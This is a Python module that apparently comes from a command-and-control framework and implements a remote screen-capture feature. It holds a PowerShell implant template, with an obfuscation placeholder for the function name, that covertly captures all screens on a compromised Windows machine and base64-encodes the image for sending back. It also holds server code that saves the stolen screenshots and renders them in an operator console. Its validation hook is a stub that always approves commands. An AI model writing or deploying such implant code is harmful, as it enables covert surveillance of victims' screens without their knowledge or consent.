import secrets
import base64

from Storage.settings import Settings

class ScreenCapture:
    type = "SC"
    args = "base64 target file"
    input = "screenshot"

    def process_implant_response(self, data, args):

        filename = secrets.token_hex(4)
        download_file_path = f"{Settings.file_download_folder}downloaded_file_{filename}.png"
        with open(download_file_path, 'wb') as file_h:

            file_h.write(base64.b64decode(data))
        return f"Screenshot downloaded: {args}\nFile saved to {download_file_path}\n" \
               f"<img id=\"{filename}\"onclick=get_image_value(\"{filename}\") src=\"data:image/png;base64,{data.decode()}\" style=\"width:100%;max-width:600px\">", None


    def implant_text(self):
        var = '''
function {{ ron.obf_screen_capture }} (){
    [Reflection.Assembly]::LoadWithPartialName("System.Drawing") | out-nUll
    [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing") 
    [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
    $width = 0;
    $height = 0;
    $workingAreaX = 0;
    $workingAreaY = 0;
    $screen = [System.Windows.Forms.Screen]::AllScreens;
    foreach ($item in $screen)
    {
        if($workingAreaX -gt $item.WorkingArea.X) { $workingAreaX = $item.WorkingArea.X; }
        if($workingAreaY -gt $item.WorkingArea.Y) { $workingAreaY = $item.WorkingArea.Y; }
        $width = $width + $item.Bounds.Width;
        if($item.Bounds.Height -gt $height) { $height = $item.Bounds.Height; }
    }
    $bounds = [Drawing.Rectangle]::FromLTRB($workingAreaX, $workingAreaY, $width, $height); 
    $bmp = New-Object Drawing.Bitmap $width, $height;
    $graphics = [Drawing.Graphics]::FromImage($bmp);
    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);
    $fs = New-Object IO.MemoryStream
    $bmp.Save($fs, "Png")
    $global:tr = [System.Convert]::ToBase64String($fs.ToArray())
    $graphics.Dispose();
    $bmp.Dispose();
}'''
        return var

    def pre_process_command(self, argument_string):
        # Check if the argument to be passed to the implant is valid.
        # I.e.
        #    Does the file to be uploaded exist local?
        #    Is the command to be executed dangerous?
        return True
